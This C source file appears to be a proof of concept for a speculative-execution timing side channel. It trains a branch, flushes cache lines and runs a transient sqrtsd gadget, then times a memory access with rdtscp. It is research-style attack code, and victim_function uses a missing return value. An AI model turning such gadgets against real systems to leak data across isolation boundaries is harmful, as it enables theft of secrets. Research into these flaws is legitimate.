#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <x86intrin.h>
#include <xmmintrin.h>
//#include "low.h"


#define FAST 0x40f0000000000000
#define SLOW 0x0010deadbeef1337
#define SIZE 256
#define STRIDE 1024
#define BARRIER asm volatile ("lfence;\nmfence;\nsfence");
#define CLFLUSH(a) \
{ \
      asm volatile ("clflush 0(%0)": : "r" (&a):); \
}


uint64_t global_variable = 0xf;
uint64_t tmp;
unsigned int dummy;
uint64_t start, end;
__m128d slow, fast, result;
double value;
uint8_t array[SIZE * STRIDE] __attribute__((aligned(512)));

double victim_function(double value, int isPublic)
{
  double tmp_value;
  for (volatile int i = 0; i < 200; i++);
  BARRIER
  
  if (isPublic < array[0x2 * STRIDE]) {
    tmp_value = value * value; //value * value;

    asm volatile (".rept 80");
    asm volatile ("sqrtsd %xmm0, %xmm1");
    asm volatile (".endr");

    *(volatile uint64_t*)&global_variable;

  }
}


int main()
{
  uint64_t slow_imm = SLOW;
  uint64_t fast_imm = FAST;

  double zero = 0;
  double fast2, slow2; 
  
  asm volatile ("movq %0, %%xmm3" :: "m"(fast_imm));
  asm volatile ("sqrtsd %xmm3, %xmm4");
  asm volatile ("movq %%xmm4, %0" :: "m"(fast2));


  asm volatile ("movq %0, %%xmm3" :: "m"(slow_imm));
  asm volatile ("sqrtsd %xmm3, %xmm4");
  asm volatile ("movq %%xmm4, %0" :: "m"(slow2));

  value = fast2;
  //value = slow2;
  BARRIER

  for (int i = 0; i < sizeof(array); i++)
    array[i] = 0x0;
  array[0x2 * STRIDE] = 10;
  
  BARRIER
  CLFLUSH(array[0 * STRIDE]);
  BARRIER

  victim_function(zero,0);
  victim_function(zero,0);

  BARRIER
  CLFLUSH(array[0x2 * STRIDE]);
  CLFLUSH(global_variable);
  BARRIER

  double tmp_value = victim_function(value,100);

  BARRIER
  start = __rdtscp(&dummy);
  *(volatile uint8_t*)&global_variable;
  end = __rdtscp(&dummy) - start;
  
  BARRIER

  //printf("Timing %ld, %f\n", end, tmp_value);
  printf("Timing %ld\n", end);
}
